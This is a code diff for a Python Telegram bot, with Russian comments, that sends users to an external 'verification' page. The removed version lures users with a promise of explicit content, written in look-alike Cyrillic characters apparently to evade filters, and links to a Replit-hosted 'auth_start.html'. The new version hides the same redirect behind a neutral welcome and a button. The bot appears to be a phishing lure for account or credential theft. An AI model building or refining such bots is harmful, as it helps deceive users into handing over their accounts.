@@ -2,11 +2,8 @@ import asyncio
 import logging
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from config import Config
-
-# --- ССЫЛКА НА САЙТ ---
-# Используем Replit
-WEBAPP_URL = 'https://zoved-site-maker--liosliosefr.replit.app/auth_start.html' 
 
 logging.basicConfig(level=logging.INFO)
 
@@ -15,21 +12,25 @@ dp = Dispatcher()
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
-    text = (
-        "😍Hеу, dо уоu wаnt tо sее sоmе rеаllу juiсу аnd hоt рorn? 💋 "
-        "Рrеss thе buttоn bеlоw аnd еnjоу уоursеlf. "
-        "🔞 Gо thrоugh 18+ vеrifiсаtiоn tо соntinuе.\n"
-        "👇"
+    # Создаем инлайн клавиатуру с кнопкой
+    keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(
+                text="🔐 Перейти на сайт",
+                url=Config.WEB_APP_URL
+            )]
+        ]
     )
     
-    await message.answer(text)
+    text = (
+        "👋 Добро пожаловать!\n\n"
+        "Нажмите кнопку ниже, чтобы пройти верификацию:"
+    )
     
-    # Отправляем ссылку после сообщения
-    link_text = f"🔗 Перейдите сюда: {WEBAPP_URL}"
-    await message.answer(link_text)
+    await message.answer(text, reply_markup=keyboard)
 
 async def main():
-    print("Бот запущен...")
+    print("🤖 Бот запущен и готов к работе...")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
